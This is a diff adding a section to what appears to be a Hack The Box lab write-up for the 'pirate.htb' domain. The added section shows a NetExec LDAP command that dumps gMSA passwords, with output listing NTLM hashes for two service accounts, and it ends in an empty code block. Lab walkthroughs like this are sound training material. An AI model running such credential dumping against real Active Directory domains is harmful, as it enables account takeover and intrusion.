@@ -210,7 +210,22 @@ SMB         dc01.pirate.htb 445    DC01             [+] PIRATE.HTB\ms01 from cca
 
 Both allow me to authenticate
 
-# Compromising `gMSA_ADCS_prod$` adn 
+# Compromising `gMSA_ADCS_prod$` and `gMSA_ADFS_prod$`
+
+```python
+faketime -f +7h nxc ldap dc01.pirate.htb --use-kcache --gmsa
+LDAP        dc01.pirate.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never) 
+LDAP        dc01.pirate.htb 389    DC01             [+] PIRATE.HTB\ms01 from ccache 
+LDAP        dc01.pirate.htb 389    DC01             [*] Getting GMSA Passwords
+LDAP        dc01.pirate.htb 389    DC01             Account: gMSA_ADCS_prod$      NTLM: aa831d274ee80cf2092f68cbcf29093e     PrincipalsAllowedToReadPassword: Domain Secure Servers
+LDAP        dc01.pirate.htb 389    DC01             Account: gMSA_ADFS_prod$      NTLM: e819498ec29f595382df1eaf4fb42307     PrincipalsAllowedToReadPassword: Domain Secure Servers
+```
+
+I have both NT hashes for both of these accounts
+
+```python
+
+```
 
 
 
